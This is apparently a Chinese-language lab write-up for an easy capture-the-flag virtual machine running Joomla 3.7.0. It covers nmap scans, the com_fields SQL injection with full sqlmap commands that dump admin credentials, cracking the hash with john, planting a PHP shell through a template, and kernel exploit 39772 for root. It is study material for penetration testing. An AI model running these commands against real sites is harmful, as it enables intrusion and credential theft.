> 报错 IDE 设备 配置不正确 虚拟机->设置->选择:磁盘/光驱IDE设备"->高级->IDE选择IDE0:0
## 靶机信息

级别:容易


## Recon

### nmap

```shell
sudo arp-scan -l
192.168.1.162   00:0c:29:58:e3:df

sudo nmap -sT --min-rate 10000 192.168.1.162 -oA tcp_scan/ports
PORT   STATE SERVICE
80/tcp open  http

sudo nmap -sT -P 80 -sV -sC 192.168.1.162
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home

扫描到使用的是Joomla
```

## Web
![[Pasted image 20231020170632.png]]
![[Pasted image 20231020173417.png]]
查看源码看到一串base64编码
```shell
aHR0cDovLzE5Mi4xNjguMS4xNjIvaW5kZXgucGhwLzItdW5jYXRlZ29yaXNlZC8xLXdlbGNvbWU=
http://192.168.1.162/index.php/2-uncategorised/1-welcome
```

## Joomscan
```shell
sudo apt install -y joomscan
joomscan --url 192.168.1.162
[+] Detecting Joomla Version
[++] Joomla 3.7.0

searchsploit Joomla 3.7.0
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                                 | php/webapps/42033.txt
URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27

Using Sqlmap:

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

```

### sqlmap
```shell
sqlmap -u "http://192.168.1.162/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --dbs --batch

available databases [5]:
[*] information_schema
[*] joomladb
[*] mysql
[*] performance_schema
[*] sys

sqlmap -u "http://192.168.1.162/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomladb -
-tables --batch

sqlmap -u "http://192.168.1.162/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C name,password --dump

admin  | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu 
echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' hash
john hash
snoopy
```

![[Pasted image 20231020194812.png]]
可以上传一个php文件,上传后发现无法上传，但是可以写入

![[Pasted image 20231020195559.png]]
点击Template Preview即可触发shell

## 提权
```shell
内核漏洞提权
39772
wget 下载文件到靶机/tmp目录下，解压后按照说明执行即可
```


![[Pasted image 20231020201156.png]]


